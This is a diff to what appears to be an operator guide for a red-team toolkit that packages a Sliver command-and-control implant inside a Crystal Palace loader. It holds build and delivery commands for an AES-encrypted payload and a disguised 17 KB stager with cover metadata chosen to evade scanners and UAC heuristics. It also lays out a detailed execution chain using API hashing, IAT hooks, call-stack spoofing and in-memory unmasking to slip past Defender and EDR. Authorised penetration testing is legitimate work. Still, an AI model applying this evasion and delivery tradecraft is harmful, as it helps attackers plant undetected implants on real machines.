@@ -174,7 +174,7 @@ If you see those two lines and the implant survives, the Extension plumbing work
 
 ## Phase 2 — Use case A (implant evasion, primary)
 
-Goal: build a Crystal-Palace-wrapped Sliver implant PICO and execute it on the target via the bundled stager. Defender / EDR sees only the stager and a position-independent blob; the actual Sliver DLL is XOR-masked inside the PICO until runtime unmask.
+Goal: build a Crystal-Palace-wrapped Sliver implant PICO and execute it on the target via the custom stager. Defender / EDR sees only the stager (17 KB, normal entropy) and an opaque AES-encrypted payload file; the actual Sliver DLL is XOR-masked inside the PICO and the PICO is AES-256-CBC encrypted at rest.
 
 ### 2.1 Build Crystal-Kit objects
 
@@ -207,39 +207,49 @@ Expected output: PICO ~110-120 KB, written to `build/prod.crystal.bin`.
 ### 2.4 Bundle with the stager
 
 ```bash
-./crystal-kit-sliver/sliver-glue/bundle-implant.sh \
+./crystal-kit-sliver/sliver-glue/bundle-stager.sh \
     crystal-kit-sliver/sliver-glue/build/prod.crystal.bin \
-    crystal-kit-sliver/sliver-glue/build/drop.zip
+    crystal-kit-sliver/sliver-glue/build/csvchelper.exe
 ```
 
-Resulting `drop.zip` (~180 KB) contains:
+Produces two files in `build/` — both must be delivered together:
 
-- `run.x64.exe` (Crystal Palace stager, BSD)
-- `prod.crystal.bin` (your PICO)
-- `README.txt` (operator notes)
+- `csvchelper.exe` (~17 KB, custom stager, no embedded payload, normal entropy)
+- `payload.dat` (~36 MB, AES-256-CBC encrypted PICO — no PE headers visible to scanners)
+
+A fresh AES-256 key and IV are generated per build, so the binary and payload are unique on every compile. Edit `stager/resource.rc` to change the cover identity (company name, description, filename) before delivery. Avoid the words "update", "install", "setup", "service" in `FileDescription` — they trigger Windows UAC auto-elevation heuristics. The embedded `asInvoker` manifest already suppresses elevation, but cleaner metadata reduces scanner attention.
 
 ### 2.5 Drop on the Windows VM
 
-Transfer `drop.zip` to the VM through the channel that matches your engagement (scp from operator, USB, SMB share, HTTP serving, etc.). Extract and execute:
+Transfer **both files** to the same directory on the target through the channel that matches your engagement (scp, USB, SMB share, HTTP, etc.):
 
 ```cmd
-C:\Users\Public> unzip drop.zip
-C:\Users\Public> run.x64.exe prod.crystal.bin
+C:\Users\Public> dir
+csvchelper.exe    (17 KB stager)
+payload.dat       (~36 MB encrypted PICO)
+
+C:\Users\Public> csvchelper.exe
 ```
 
-Execution order inside `run.x64.exe`:
+`csvchelper.exe` and `payload.dat` must sit in the same directory — the stager resolves `payload.dat` relative to its own path via `GetModuleFileNameW`. No arguments needed.
 
-1. `run.x64.exe` reads `prod.crystal.bin` into RWX memory
-2. Jumps to offset 0 of the PICO (Crystal Palace `+gofirst` guarantees `go` is there)
-3. Crystal Palace loader resolves Win32 APIs via ror13 hashing
-4. Installs IAT hooks on `VirtualAlloc` / `VirtualProtect` / `VirtualFree` / `LoadLibraryA`
-5. Installs Draugr call-stack spoofing
-6. Unmasks (XOR) the embedded Sliver DLL into a new allocation (`dll_dst`)
-7. Registers the beacon's `.pdata` exception table via `RtlAddFunctionTable` — required so Go's runtime can call `RtlLookupFunctionEntry` on beacon addresses (goroutine stack growth / async preemption)
-8. Runs TLS callbacks (`DLL_PROCESS_ATTACH`) — CRT static init needed by CGO code
-9. Calls `DllMain(DLL_PROCESS_ATTACH)` — Go runtime init
-10. Walks the beacon export table and calls `StartW()` — this is the explicit C2-loop entry point; `DllMain` alone does **not** start the beacon goroutine
-11. `Sleep(INFINITE)` keeps the loader thread alive so the Go scheduler can run beacon goroutines
+Execution order inside `csvchelper.exe`:
+
+1. `BCryptGenRandom` noise → writes a random page to a temp file (auto-deleted), disrupts timing-based scanners
+2. `RegOpenKeyExW(HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion)` — normal-looking init
+3. Reads `payload.dat` from its own directory
+4. `BCryptDecrypt` (AES-256-CBC, key baked in at compile time) → plaintext PICO in heap
+5. `VirtualAlloc(RW)` + `memcpy` + `SecureZeroMemory` on heap buffer + `VirtualProtect(RX)` — no RWX at any point
+6. `CreateThread` → PICO entry at offset 0 (Crystal Palace `+gofirst` guarantees `go` is there)
+7. Crystal Palace loader resolves Win32 APIs via ror13 hashing
+8. Installs IAT hooks on `VirtualAlloc` / `VirtualProtect` / `VirtualFree` / `LoadLibraryA`
+9. Installs Draugr call-stack spoofing
+10. Unmasks (XOR) the embedded Sliver DLL into a new allocation (`dll_dst`)
+11. Registers the beacon's `.pdata` exception table via `RtlAddFunctionTable`
+12. Runs TLS callbacks (`DLL_PROCESS_ATTACH`) — CRT static init needed by CGO code
+13. Calls `DllMain(DLL_PROCESS_ATTACH)` → Go runtime init
+14. Walks the beacon export table and calls `StartW()` — starts the beacon goroutine
+15. Main thread loops on `SleepEx(30000, TRUE)` to keep the process alive
 
 On the Sliver console:
 
@@ -405,8 +415,11 @@ Windows VM — remove any uploaded PICO files:
 ```cmd
 C:\> del C:\Windows\Temp\*.pico.bin
 C:\> del C:\Windows\Temp\*.bin
-C:\> taskkill /F /IM run.x64.exe
+C:\> taskkill /F /IM csvchelper.exe
+C:\> del payload.dat
 ```
+
+Adjust the binary name to whatever you renamed the stager to before delivery.
 
 Local Kali build artifacts:
 
@@ -443,13 +456,13 @@ echo "" > /tmp/empty.args
     external/crystalpalace/dist/demo/test.x64.dll \
     crystal-kit-sliver/sliver-glue/build/test-implant.bin
 
-./crystal-kit-sliver/sliver-glue/bundle-implant.sh \
+./crystal-kit-sliver/sliver-glue/bundle-stager.sh \
     crystal-kit-sliver/sliver-glue/build/test-implant.bin \
-    crystal-kit-sliver/sliver-glue/build/test-drop.zip
+    crystal-kit-sliver/sliver-glue/build/test-csvchelper.exe
 
 ./crystal-kit-sliver/sliver-glue/pack-extension.sh
 
 ls -la crystal-kit-sliver/sliver-glue/build/
 ```
 
-If all four artifacts are produced (`test-postex.pico.bin`, `test-implant.bin`, `test-drop.zip`, `crystal-loader-0.1.0.tar.gz`), your Kali side is fully functional.
+If all five artifacts are produced (`test-postex.pico.bin`, `test-implant.bin`, `test-csvchelper.exe`, `payload.dat`, `crystal-loader-0.1.0.tar.gz`), your Kali side is fully functional.
